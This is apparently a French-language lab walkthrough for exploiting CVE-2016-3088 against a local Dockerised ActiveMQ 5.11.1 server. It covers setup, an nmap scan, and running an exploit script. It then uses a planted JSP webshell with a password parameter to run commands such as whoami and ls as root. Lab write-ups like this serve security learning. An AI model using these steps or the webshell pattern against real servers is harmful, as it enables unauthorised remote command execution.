# Exploitation de CVE-2016-3088

Ce document détaille l'exploitation de la vulnérabilité **CVE-2016-3088** sur un serveur ActiveMQ. Il comprend la configuration de l'environnement, l'exécution de l'exploit, et la vérification de l'accès.

---

## **1. Configuration de l'environnement ActiveMQ**

### Lancer ActiveMQ avec Docker
1. Accédez au dossier `activemq_2016`.
2. Lancez ActiveMQ en arrière-plan avec Docker Compose :
   ```bash
   docker compose up -d
   ```
3. Accédez à l'interface d'administration ActiveMQ dans un navigateur :
   ```
   http://localhost:8161/admin/
   ```

![Interface ActiveMQ](https://github.com/user-attachments/assets/e20e4588-3776-4320-a3bb-e73a6db35405)

### Vérifier la version d'ActiveMQ
- La version d'ActiveMQ est visible dans l'interface d'administration, ici : **5.11.1**.
- Vous pouvez également confirmer la version dans le fichier `docker-compose.yml` :

![Version dans docker-compose.yml](https://github.com/user-attachments/assets/52a231f2-a055-442a-b362-cec6ed79b7bd)

---

## **2. Identifier les services actifs**

Utilisez `nmap` pour scanner le réseau et vérifier les services disponibles :
```bash
nmap -p- 192.168.1.145
```

![Résultats de nmap](https://github.com/user-attachments/assets/adf66034-e307-4601-8485-cc26b76d2a32)

---

## **3. Exploiter la vulnérabilité**

### Lancer l'exploit
1. Exécutez le script Python pour exploiter la faille :
   ```bash
   python3 CVE-2016-3088.py -u http://localhost:8161/
   ```

   ![Exécution de l'exploit](https://github.com/user-attachments/assets/c34cc77c-42b1-4d43-9c97-e98e63946e14)

### Accéder au WebShell
2. Si l'exploit réussit, vous pouvez accéder au WebShell malveillant via l'URL suivante :
   ```
   http://localhost:8161/api/evil.jsp?pwd=9527&i=whoami
   ```

   - Cette commande retourne l'utilisateur courant (ici `root`), prouvant que l'exploit a fonctionné.

   ![Confirmation de l'accès root](https://github.com/user-attachments/assets/9b6de1b9-f5a5-470c-b8b9-0faf53f3d8b4)

3. Remplacez `whoami` par d'autres commandes pour interagir avec le serveur.
   Exemple :
   ```
   http://localhost:8161/api/evil.jsp?pwd=9527&i=ls
   ```
   - Cette commande liste les fichiers sur le serveur :

   ![Affichage des fichiers](https://github.com/user-attachments/assets/2b1241fb-b26f-4f18-abff-4db980a52eb0)

---
